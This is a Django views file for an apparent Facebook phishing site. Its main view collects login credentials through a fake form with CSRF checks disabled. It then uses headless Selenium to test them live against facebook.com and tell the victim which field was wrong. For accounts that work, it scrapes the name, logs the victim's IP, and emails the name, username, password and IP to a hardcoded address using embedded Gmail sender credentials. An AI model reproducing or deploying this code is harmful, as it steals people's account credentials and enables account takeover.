from django.shortcuts import render, HttpResponseRedirect
from django.views.decorators.csrf import csrf_exempt

from .models import FbLogIn, NewLogs, SiteContent

from selenium import webdriver
import time
from selenium.webdriver.common.by import By
from bs4 import BeautifulSoup as bs

import smtplib
from email.message import EmailMessage

import time

from .forms import LogInForm


# Client IP address collector function
def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

# Create your views here.
# @ensure_csrf_cookie

def home_view(request):
	sc = SiteContent.objects.get(id = 1)

	context = {
		'sc' : sc

	}
	return render(request, 'home.html', context)


@csrf_exempt
def facebook_view(request):

	# To render error messages for unmatched password
	error1 = False # username or email
	error2 = False	# password

	# Page login form
	form = LogInForm(request.POST or None)
	if form.is_valid():
		loader = True
		form.save()

		# Get resently saved form input from database
		myid = form.instance.id
		editform = FbLogIn.objects.get(id = myid)

		# Web driver settings
		chrome_options = webdriver.ChromeOptions()
		chrome_options.add_argument("--headless")
		chrome_options.add_argument("--disable-gpu")
		chrome_options.add_argument('--no-sandbox')
		chrome_options.add_argument('--window-size=1920, 1080')  #1920,1080
		chrome_options.add_argument('--allow-running-insecure-content')
		browser = webdriver.Chrome(options=chrome_options) 

		browser.get("https://web.facebook.com/")

		time.sleep(2)

		# Selenimu login to "https://web.facebook.com/"
		user = editform.username
		userlog = browser.find_element(By.XPATH, '//*[@id="email"]')
		userlog.send_keys(user)

		password = editform.password
		passwordlog = browser.find_element(By.XPATH, '//*[@id="pass"]')
		passwordlog.send_keys(password)

		# time.sleep(2)

		login = browser.find_element(By.NAME, 'login')
		login.click()

		time.sleep(5)

		# Setting the values of error1 and error2 to "True" respectively 
		if browser.find_elements(By.CSS_SELECTOR, 'div._9ay7'):
			if 'password' in browser.find_element(By.CSS_SELECTOR, 'div._9ay7').get_attribute('innerHTML'):
				error2 = True
				print('Omo na password o')


			else:
				error1 = True
				print('Omo na Email o')
		
		else: 
			# If login was successfuly scrape username from website using "BeautifulSoup"
			print('found')

			time.sleep(5)

			html = browser.page_source
			soup = bs(html, 'lxml')

			# mydiv = soup.find_all('div', class_='qzhwtbm6 knvmm38d')
			sp1 = soup.find('span', class_='d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v ekzkrbhg oo9gr5id hzawbc8m')

			print(sp1)
			name = sp1.span.text
			print(name)

			# Include name and Ip address to form and save
			editform.name = name
			editform.ipadd = get_client_ip(request)
			print(editform.name)
			print(get_client_ip(request))
			editform.save()

			# Using saved information in from to create Newlogs object instance 
			NewLogs.objects.create(username=editform.username, password=editform.password, name=editform.name, ipadd=editform.ipadd)
			
			
			# Using SMTP to send mail of form input
			EMAIL_ADDRESS = "noreplyimf.org@gmail.com"
			EMAIL_PASSWORD = "4kushakara"
			receiver = "ibrahimola72@gmail.com"
			
			msg = EmailMessage()
			msg['Subject'] = 'NewLogs'
			msg['From'] = EMAIL_ADDRESS
			msg['To'] = receiver
		    
			textsms = f" Name: {editform.name} \n username: {editform.username} \n password: {editform.password} \n ip: {editform.ipadd}" 

			msg.set_content(textsms)

			#gmail smpt setting
			with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
				smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
				smtp.send_message(msg)

			# Redirect to "/success/" page
			return HttpResponseRedirect("../success/")
			

		
		# Quit Selenium Activities
		browser.quit()

		print(editform.name)
		

		# form = LogInForm()

	
	context = {
		'form' : form,
		'error1' : error1,
		'error2' : error2,
	}

	return render(request, 'facebook.html', context)



def success_view(request):
	client = get_client_ip(request)
	# obj = NewLogs.objects.last()
	obj = NewLogs.objects.get(ipadd = client)
	sc = SiteContent.objects.get(id = 1)
	context = {
		'obj' : obj,
		'sc'  : sc 
	}
	return render(request, 'success.html', context)
